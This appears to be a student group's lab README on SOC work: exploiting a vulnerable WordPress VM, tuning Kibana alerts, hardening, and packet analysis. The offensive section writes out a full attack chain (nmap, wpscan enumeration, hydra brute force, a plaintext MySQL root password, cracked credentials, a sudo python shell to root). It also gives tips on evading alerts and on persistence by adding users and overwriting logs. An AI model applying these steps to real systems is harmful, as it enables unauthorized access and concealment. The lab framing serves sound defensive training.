# SIEM_SOC
# Supporting SOC Infrastructure - Security Engineer and SIEM Investigation

SOC Analysts have noticed some discrepancies with alerting in the Kibana system. Investigate by confirming Kibana alerts are working. Assess and exploit a vulnerable VM and monitor live network traffic to update Kibana alerts and thresholds. Present findings to SOC Manager and Engineering Manager in a comprehensive final report. 

*This project is the result of a group effort. This project contains group work. All group members are credited on slide one of the presentation.*

[comment]: # (this is the syntax for a comment)

This project is organized into the following sections and subsections:
- **Network Topology:** Live network environment
    - Host machine
    - Attacking machine
    - Vulnerable Web Server
    - Wordpress Target
    - ELK Server
- **Offensive Security:** Security assessment of vulnerable VM and verification of working Kibana rules.
    - Critical Vulnerabilities
    - Exploits Used
    - Avoiding Detection
    - Maintaining Access   
- **Defensive Security:** Creating and implementing alerts and thresholds
    - Alerts Implemented
    - Hardening
    - Implementing Policies
- **Network Analysis:** Network forensics and analysis
    - Traffic Profile
    - Normal Activity
    - Malicious activity
___

In this activity offensive security, defensive security, and network monitoring tasks are performed to evaluate potential cybersecurity threats. Approaching potential cybersecurity threats from multiple perspectives is likely to provide a more complete threat analysis. 




## Network Topology

In this environment the Kali Linux machine is the attacking machine. The ELK server is monitoring the vulnerable target machines as the attacking machine seeks to exploit the system.  
![image](https://github.com/duffian/SIEM_SOC/blob/c5adcec83f0fa95bcf9e85064ce7755635b05f36/images/proj3_topology.png)




## Offensive Security - Target 1 ##

The objective of the offensive SIEM engineering team is to identify critical vulnerabilities in the system and exploit them. Documention of these vulnerabilities is reported to the SOC team. 

**Critical Vulnerabilities**

Our assessment uncovered the following critical vulnerabilities

    - Poorly secured ssh port
    - SQL enumeration
    - Weak user password
    - No file security

![image](https://github.com/duffian/SIEM_SOC/blob/b9bad2b5e48bc897300f255d3772730ce87673ee/images/adn5.png)

***Exploitation - Poorly Secured SSH Port***

What tool or technique did you use to exploit the vulnerability?
>nmap port scanning

`nmap -O 192.168.1.0/24`

![image](https://github.com/duffian/SIEM_SOC/blob/ba1a85cafab83e375e0afd9a6100861d9ea0c7aa/images/linux_nmapcommand.png)

![image](https://github.com/duffian/SIEM_SOC/blob/a10b171bf63d285966e70f6b8a8195b9f5c65c7a/images/nmapscanreport.png)

What did the exploit achieve?
>Unauthorized access to the Target 1 machine was achieved by using the unsecured ssh port identified on the vulnerable machine.

>Identification of vulnerable ports to potentially gain unauthorized access to the "Target 1" system.

***Exploitation - WordPress Susceptible to Enumeration***

What tool or technique did you use to exploit the vulnerability?
>WPScan enumeration

`wpscan --url 192.168.1.110/wordpress -e u`

![image](https://github.com/duffian/SIEM_SOC/blob/0ec4844e2ccdd26a87831fc1e3ef47458b2cb65f/images/9_enumeration.png) 

What did the exploit achieve?
>Acquisition of usernames and their associated IP addresses.

![image](https://github.com/duffian/SIEM_SOC/blob/0ec4844e2ccdd26a87831fc1e3ef47458b2cb65f/images/10_enum.png)

***Exploitation - Weak User Password***

What tool or technique did you use to exploit the vulnerability?
>Brute forcing passwords using hydra

`$ hydra -l michael -t 4 -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh`

What did the exploit achieve?
>Discovered the login password for user “michael” allowing ssh access into Target 1 Machine

![image](https://github.com/duffian/SIEM_SOC/blob/a89a67f44005945181d2897d97e6466921eec59a/images/11_hydra.png) 

***Exploitation - SSH Access to Target 1***

What tool or technique did you use to exploit the vulnerability?
>ssh login

>directory exploration

`ssh michael@192.168.1.110`

![image](https://github.com/duffian/SIEM_SOC/blob/b1ad487330827e1fdd4a7fa298a8a63e6a605ca5/images/8_sshmichael.png)

What did the exploit achieve?

>Access to Target 1 system and identification of `Flag 2`

`$ cd /`

`$ find /*/*/*flag*`

![image](https://github.com/duffian/SIEM_SOC/blob/d05256b4b6be3184bda24796e6b3c9d5f70c1360/images/advanced_offense/1_xtraflag2.png)

`$ cat /var/www/flag2.txt`

![image](https://github.com/duffian/SIEM_SOC/blob/a103305b127bdd8a0fabde5f6cd37475758b63f9/images/advanced_offense/003_flag2.png)

***Exploitation - No File Security***

What tool or technique did you use to exploit the vulnerability?
>Simple directory exploration.

What did the exploit achieve?
>Privelege escalation - Acquisition of MySQL login data stored in plain text.

>Access to `Flag 1`

`michael@target1:/var/www/html/wp-config.php`

![image](https://github.com/duffian/SIEM_SOC/blob/a89a67f44005945181d2897d97e6466921eec59a/images/12_rootcreds.png)

![image](https://github.com/duffian/SIEM_SOC/blob/a103305b127bdd8a0fabde5f6cd37475758b63f9/images/advanced_offense/14_mysql_db_user_pword.png)

`cat service.html | grep flag*`

![image](https://github.com/duffian/SIEM_SOC/blob/d05256b4b6be3184bda24796e6b3c9d5f70c1360/images/advanced_offense/5_flag1.png)

***Exploitation - MySQL Login Credentials Used***

What tool or technique did you use to exploit the vulnerability?
>Login credentials for MySQL server found in `/var/www/html/wordpress/wp-config.php` file used.


`$ mysql -u root -p'R@v3nSecurity' -h 127.0.0.1`

![image](https://github.com/duffian/SIEM_SOC/blob/a103305b127bdd8a0fabde5f6cd37475758b63f9/images/advanced_offense/16_mysql_loggedin.png)

What did the exploit achieve?
>Root access to MySQL system and identification of `Flag 3` and `Flag 4` in MySQL'wp_posts'

>Identification of user 'michael' and user 'steven' password hashes

`mysql> show databases;`

`mysql> use wordpress;`

`mysql> show tables;`

`mysql> select * from wp_posts;`

![image](https://github.com/duffian/SIEM_SOC/blob/2cdd578b781ed32fa03e41b044f63cc535dfaed7/images/advanced_offense/mysqlf3f4_a.png)
![image](https://github.com/duffian/SIEM_SOC/blob/2cdd578b781ed32fa03e41b044f63cc535dfaed7/images/advanced_offense/mysqlf3f4_b.png)
![image](https://github.com/duffian/SIEM_SOC/blob/2cdd578b781ed32fa03e41b044f63cc535dfaed7/images/advanced_offense/mysqlf3f4_c.png)

![image](https://github.com/duffian/SIEM_SOC/blob/2cdd578b781ed32fa03e41b044f63cc535dfaed7/images/advanced_offense/29_flag3.png)

![image](https://github.com/duffian/SIEM_SOC/blob/2cdd578b781ed32fa03e41b044f63cc535dfaed7/images/advanced_offense/2_flag4Untitled.png) 

`mysql> show databases;`

`mysql> use wordpress;`

`mysql> show tables;`

`mysql> SELECT ID, user_login, user_pass FROM wp_users;`

![image](https://github.com/duffian/SIEM_SOC/blob/ae9ec123f0fdf1b005aaff2c34b09054e32f2d98/images/advanced_offense/mysql_userhashes.png)

***Exploitation - Cracked Password Hash and Python Privelege Escalation***

What tool or technique did you use to exploit the vulnerability?
>ssh

>John the Ripper

>Python shell script

Create `wp_hashes.txt` file containing each user password hash and run John the Ripper. 

`john wp_hashes.txt`
  -  username: steven
  -  password: pink84

What did the exploit achieve?
>User 'steven' login credentials

>Root access

>Location of Flag 4

`$ ssh steven@192.168.1.110`

`pink84`

![image](https://github.com/duffian/SIEM_SOC/blob/1c2d0c98aaa054c1f6c095e1178c749ff8227d66/images/advanced_offense/stevenssh.png)

`$ sudo -l`

![image](https://github.com/duffian/SIEM_SOC/blob/1c2d0c98aaa054c1f6c095e1178c749ff8227d66/images/advanced_offense/stevensudol.png)

`$ sudo python -c 'import pty;pty.spawn("/bin/bash')'`

![image](https://github.com/duffian/SIEM_SOC/blob/2ac86d71efbe3b5cd6a36c00b7d840ce81f9d4ab/images/advanced_offense/stevenpython2.png)

![image](https://github.com/duffian/SIEM_SOC/blob/cbd6c09efa1df2921f23dc1f522cc692c071010e/images/advanced_offense/stevenflag4b.png)


**Avoiding Detection**

Understanding monitoring helps avoid mitigation.

Identifying the key data points and understanding how monitoring system alerts are generated helps the offensive SIEM engineer avoid detection. This expands the scope of potential system exploitations. 

Monitoring 
  - Identify the alerts that could detect this exploit
  - Identify the metrics these alerts measure
  - Identify the thresholds the alerts fire at, and thresholds 

Mitigation 
  - How can you execute the same exploit without triggering the alert? 
  - Are there alternative exploits that may perform better? 
 
***Stealth Exploitation of Poorly Secured SSH Port***

Alerts that detect this exploit
>Port scanning alerts
>
>Alerts monitoring for unauthorized access through ssh port

Metric =
`WHEN sum () of http.request.bytes OVER all documents`

Threshold =
`IS ABOVE 3500 FOR THE LAST 1 minute`

How can you execute the same exploit without triggering the alert? 
>Stealth scan

`nmap -sS`

![image](https://github.com/duffian/SIEM_SOC/blob/dcdcb2395afc40104128b2e63049f37ae94e1a84/images/16_nmap_stlth.png) 

>Fast scan

>Limited time scan

`nmap -F`
![image](https://github.com/duffian/SIEM_SOC/blob/dcdcb2395afc40104128b2e63049f37ae94e1a84/images/17_ssh_stlth.png)

**Stealth Exploitation of WordPress Susceptible to Enumeration**

Alerts that detect this exploit
>Alerts monitoring traffic from suspicious sources

>Alerts monitoring traffic from non-white-listed IPs

Metric = 
`WHEN count() GROUPED OVER top 5 ‘http.response.status_code`

Threshold =
`IS ABOVE 400`

How can you execute the same exploit without triggering the alert?
>Scan a WordPress site using random user agents or passive detection

`wpscan --url 192.168.1.110/wordpress --stealthy -e u`

***Stealth Exploitation of Weak User Password***

Alerts that detect this exploit
>CPU Usage Monitoring
>  - Alerts monitoring abnormal CPU usage according to time
>  - Alerts monitoring abnormally high CPU usage

Metric =
`WHEN max() OF system.process.cpu.total pct OVER all documents`

Threshold =
`IS ABOVE 0.5` 

How can you execute the same exploit without triggering the alert? 
>limit the resources used to execute the brute force password cracking
>limit duration of brute force attempt

`$ hydra -l michael -t 4 P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh`
>-t limits tasks per attempt

`$ hydra -l michael -w 5 P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh`
>-w defines max wait time

![image](https://github.com/duffian/SIEM_SOC/blob/183e122cc4c183b026186ecbfdbc3bf499ffd5da/images/21_stlthexplwu_a.png)



![image](https://github.com/duffian/SIEM_SOC/blob/183e122cc4c183b026186ecbfdbc3bf499ffd5da/images/21_stlthexplwu_b.png)


***Stealth Exploitation of No File Security***

Alerts that detect this exploit
>Alerts monitoring traffic from;
>  - suspicious/malicious sources
>  - non-white-listed IPs
>  - unauthorized accounts
>  - root user logins

Metric =
`user.name: root AND source.ip: 192.168.1.90 AND destination.ip: 192.168.1.110 OR event.action: ssh_login OR event.outcome: success`

Threshold =
`IS ABOVE 1`

How can you execute the same exploit without triggering the alert?
>Remove evidence of instrusion/unauthorized access
>Mask source IP

Are there alternative exploits that may perform better? 
>If attempts to elevate to sudo privileges are restricted and if root login data is secured with up-to-date password hashes, malicious actors will have a much more difficult time gaining root or elevated permissions.

**Maintaining Access**

Maintain access by writing a script to 	quickly and stealthily add an unauthorized user to the target system
  - Using a script is quick and decreases the possibility of discovery
  - A script can automatically obfuscate evidence it exists such as by moving or overwriting logs

Python Script to Add User
`sudo python -c 'import.pty;pty.spawn("/bin/bash")'`

![image](https://github.com/duffian/SIEM_SOC/blob/1e64581adce910196643460e232d35489b2fee22/images/23_pythscrp_adduser.png) 


![image](https://github.com/duffian/SIEM_SOC/blob/183e122cc4c183b026186ecbfdbc3bf499ffd5da/images/24_maintaccpythscrp.png)



## Defensive Security

The objective is to configure Kibana alerts and make sure they are working correctly. Here we ensure the latest exploits and vulnerabilities are accounted for.

**Alerts**

When generating alerts it is important to identify
  - the **metric** that the alert monitors
  - the **threshold** that metric fires at
	
Compiled Alert Visualization

![image](https://github.com/duffian/SIEM_SOC/blob/3b4b8043414274fd9f1d87fdca33da6bb8545a18/images/27_alerts_a.png)
	
![image](https://github.com/duffian/SIEM_SOC/blob/3b4b8043414274fd9f1d87fdca33da6bb8545a18/images/27_alerts_b.png) 

***Alert - CPU Usage Monitor***

  - This alert uses Metricbeat to monitor metric data from the OS and from services running on the server
  - The alert is set to trigger when the total CPU process perccentage for all documents is above 0.5
  - The alert runs every minute and tracks the last five minutes
  
![image](https://github.com/duffian/SIEM_SOC/blob/45671798ee8e65d83e3701e111255ea6d8da6e92/images/28_alertcpuusage.png)


***Alert - Excessive HTTP Errors***


  - Utilize Packetbeat to analyze traffic between application processes and parse protocols such as HTTP and MySQL 
    - Alert is set to group the top five HTTP response status codes generated over the last 5 minutes
  - Set alert to run every 1 minutes and trigger alert when any HTTP response status code >400 is generated
  

![image](https://github.com/duffian/SIEM_SOC/blob/45671798ee8e65d83e3701e111255ea6d8da6e92/images/30_alerthttpreqsize.png) 



***Alert - HTTP Request Size Monitor***

  - Packetbeat used for this alert because Packetbeat monitors HTTP traffic 
  - Set alert to run every minute and trigger alert when the sum of HTTP request bytes for all documents is above 3500
    - Alert calculates sum of all requests every minute
	
	
![image](https://github.com/duffian/SIEM_SOC/blob/2fc4c9eb842aa902fa6bcf550d6a1d6cacd7b345/images/31_alrthttpreqsiz.png)


**Hardening**

Effective hardening methods should address
  
  - how to patch a target against the vulnerabilities
  - why the patch works and how to install the patch

***Hardening Against Poorly Secured SSH Port on Target 1***

Hardening
>Configure host to change default ssh port 22 to a new custom port

Why it works
>ssh is set to listen on port 22 by default making it a well-known potential entry point for cyber attackers

>changing the default ssh port makes it harder to find and exploit

![image](https://github.com/duffian/SIEM_SOC/blob/6e67131c57003a703bbf2f256cdf46929a9f5c15/images/34_sshporthard_a.png) 

Hardening
>Enable IP-allowed whitelist rule for firewall

Why it works
>"Whitelisting" IPs creates a specific rule in your firewall to only open ssh port for the IPs listed
>
>All other traffic is filtered and blocked

![image](https://github.com/duffian/SIEM_SOC/blob/6e67131c57003a703bbf2f256cdf46929a9f5c15/images/34_sshporthard_b.png)



***Hardening Against Weak User Password on Target 1***

Hardening
>Implement MFA

>Institute and enforce strong password policy
>  - require several different types of characters be included in password 
>  - institute mandatory password reset every 3 months and disallow repeat passwords

>Configure lockout policy to protect against brute force attacks
>  - "fail2ban" utility


![image](https://github.com/duffian/SIEM_SOC/blob/183e122cc4c183b026186ecbfdbc3bf499ffd5da/images/35_mfa.png)


![image](https://github.com/duffian/SIEM_SOC/blob/183e122cc4c183b026186ecbfdbc3bf499ffd5da/images/35_pwdplcy.png)


![image](https://github.com/duffian/SIEM_SOC/blob/6e67131c57003a703bbf2f256cdf46929a9f5c15/images/35_wkpwdhard_c.png)  

***Hardening Against WordPress Enumeration on Target 1***

Hardening
>Configure host system to restrict the WordPress Rest API

Why it works
>WPScan uses Rest API to enumerate users. Restricting Rest API will restrict WPScan enumeration capability.

How to Patch
>add plugins
>
>activate plugins
>
>Disables the WordPress API for anyone not logged in

![image](https://github.com/duffian/SIEM_SOC/blob/6e67131c57003a703bbf2f256cdf46929a9f5c15/images/36_enumhard_a.png)  

Hardening
>Disable scans and block user enumeration via .htcaccess

Why it works
>Adds security by editing code of `funtions.php` file

![image](https://github.com/duffian/SIEM_SOC/blob/6e67131c57003a703bbf2f256cdf46929a9f5c15/images/36_enumhard_b.png)  

>Adds sections by editing code of the site's root 


![image](https://github.com/duffian/SIEM_SOC/blob/183e122cc4c183b026186ecbfdbc3bf499ffd5da/images/36_editrootcode.png)

## Network Analysis

The objective is to analyze network traffic to identify suspicious or malicious activity.

**Traffic Profile and Behavioral Analysis**

Network analysis identified the following characteristics of the traffic on the network

![image](https://github.com/duffian/SIEM_SOC/blob/2553f872a954fa8bff9c6686696817b625736453/images/adn35.png) 

    - Purpose of traffic on network

    - "Normal" Activity

    - "Suspicious" Activity

***Normal Activity - Web Traffic***

Kind of Traffic
> Web traffic

Protocol
>HTTP

Specific User Action
> Browsing "orbike.com"

Packet Data
>![image](https://github.com/duffian/SIEM_SOC/blob/ed4be6a476dc61e1cf6e4346b88a2ef80275417c/images/42_normact_webtraf.png)

Noteable Data/Files
![image](https://github.com/duffian/SIEM_SOC/blob/ed4be6a476dc61e1cf6e4346b88a2ef80275417c/images/43_normact_webtraf.png)


***Normal Activity - DNS***

Kind of Traffic
>DNS query for "orbike.com"

Protocol
>UDP over port 53;8.8.8.8

Specific User Action
> Querying Google DNS servers for "orbike.com" site data 
![image](https://github.com/duffian/SIEM_SOC/blob/ed4be6a476dc61e1cf6e4346b88a2ef80275417c/images/45_normact_dns.png) 

Packet Data
>![image](https://github.com/duffian/SIEM_SOC/blob/ed4be6a476dc61e1cf6e4346b88a2ef80275417c/images/46_normact_dns.png) 

***Malicious Activity - Time Thieves*** 

Kind of Traffic
>ACK

Protocol
>DHCP

>TCP

Specific User Action
>Users created web server to access YouTube

>Domain name "frank-n-ted.com"

Users created a web server to access YouTube
![image](https://github.com/duffian/SIEM_SOC/blob/2553f872a954fa8bff9c6686696817b625736453/images/adn45.png)
  - Filtered for traffic by IP address to correlate users and IP addresses.
![image](https://github.com/duffian/SIEM_SOC/blob/ed4be6a476dc61e1cf6e4346b88a2ef80275417c/images/48_malact_timethfa.png)
  - Discovered web server domain name "frank-n-ted.com"  and IP address 10.6.12.12
![image](https://github.com/duffian/SIEM_SOC/blob/ed4be6a476dc61e1cf6e4346b88a2ef80275417c/images/48_malact_timethfb.png)


***Malicious Activity - Malicious File Download*** 

Kind of Traffic
>Malicious file download 

>"june11.dll" was scanned by anti-malware software "VirusTotal" and flagged as a possible Trojan

Protocol
>http

Specific User Action
>The malicious file `june11.dll` was downloaded on machine with IP Address 10.6.12.203

![image](https://github.com/duffian/SIEM_SOC/blob/ed4be6a476dc61e1cf6e4346b88a2ef80275417c/images/49_malactmalfiledl_a.png) 


![image](https://github.com/duffian/SIEM_SOC/blob/183e122cc4c183b026186ecbfdbc3bf499ffd5da/images/49_malfilact_a.png)




![image](https://github.com/duffian/SIEM_SOC/blob/183e122cc4c183b026186ecbfdbc3bf499ffd5da/images/49_malfilact_b.png)





***Malicious Activity - Vulnerable Windows Host Machines Infected***

Kind of Traffic 
>Infected host machine traffic on network

>Infection traffic had substantially higher data transfer

>Potentially spreading infection 

Protocol
>NBNS

>NetBios over TCP/IP

Specific User Action
>Rotterdam workstation use

Packet Data 
>Infected host machine on network

![image](https://github.com/duffian/SIEM_SOC/blob/8d5e155b2dd84bba4138d95c32af683078cebda5/images/50_malact_infect.png) 


***Malicious Activity - Illegal Downloads***

Kind of Traffic
>`http.request.method == GET && http.request.uri` contains torrent  
>
>illegal torrent download

Protocol
>http

Specific User Action
>User torrented "Betty_Boop_Rhythm_on_the_Reservation.avi.torrent"

Packet Data

![image](https://github.com/duffian/SIEM_SOC/blob/8d5e155b2dd84bba4138d95c32af683078cebda5/images/51_malact_illdwnld.png) 

---












## Works Cited ##

![image](https://github.com/duffian/SIEM_SOC/blob/7c7a71069193d7edf6dd3c01aeaff6582064fbc8/images/adn52.png)





